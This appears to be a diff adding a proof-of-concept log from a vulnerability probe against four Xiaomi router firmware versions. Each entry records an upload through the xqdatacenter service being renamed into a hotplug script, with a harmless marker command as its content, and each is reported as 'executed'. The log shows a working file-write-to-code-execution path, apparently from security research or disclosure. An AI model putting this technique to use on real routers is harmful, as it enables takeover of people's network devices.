@@ -1,0 +1,32 @@
+[run] BE3600 rn01 1.0.74
+xqlog	7	dest=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE3600_rn01_1.0.74/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+rename.src=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE3600_rn01_1.0.74/userdisk/upload.tmp
+rename.dst=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE3600_rn01_1.0.74/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+write_json.code=0
+uploaded.path=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE3600_rn01_1.0.74/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+uploaded.content=echo XIAOMI_XQDATACENTER_BYTECODE_RCE > /tmp/xiaomi_xqdatacenter_bytecode_marker
+[ok] BE3600 rn01 1.0.74 real xqdatacenter.upload bytecode wrote a hotplug payload that executed
+[run] BE10000 rp04 1.0.89
+xqlog	7	dest=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE10000_rp04_1.0.89/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+rename.src=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE10000_rp04_1.0.89/userdisk/upload.tmp
+rename.dst=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE10000_rp04_1.0.89/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+write_json.code=0
+uploaded.path=/tmp/xiaomi_xqdatacenter_bytecode_probe/BE10000_rp04_1.0.89/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+uploaded.content=echo XIAOMI_XQDATACENTER_BYTECODE_RCE > /tmp/xiaomi_xqdatacenter_bytecode_marker
+[ok] BE10000 rp04 1.0.89 real xqdatacenter.upload bytecode wrote a hotplug payload that executed
+[run] AX3000T rd03 1.0.64
+xqlog	7	dest=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03_1.0.64/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+rename.src=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03_1.0.64/userdisk/upload.tmp
+rename.dst=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03_1.0.64/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+write_json.code=0
+uploaded.path=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03_1.0.64/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+uploaded.content=echo XIAOMI_XQDATACENTER_BYTECODE_RCE > /tmp/xiaomi_xqdatacenter_bytecode_marker
+[ok] AX3000T rd03 1.0.64 real xqdatacenter.upload bytecode wrote a hotplug payload that executed
+[run] AX3000T rd03v2 2.0.12
+xqlog	7	dest=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03v2_2.0.12/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+rename.src=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03v2_2.0.12/userdisk/upload.tmp
+rename.dst=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03v2_2.0.12/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+write_json.code=0
+uploaded.path=/tmp/xiaomi_xqdatacenter_bytecode_probe/AX3000T_rd03v2_2.0.12/etc/hotplug.d/iface/99-xqdatacenter-bytecode-rce
+uploaded.content=echo XIAOMI_XQDATACENTER_BYTECODE_RCE > /tmp/xiaomi_xqdatacenter_bytecode_marker
+[ok] AX3000T rd03v2 2.0.12 real xqdatacenter.upload bytecode wrote a hotplug payload that executed
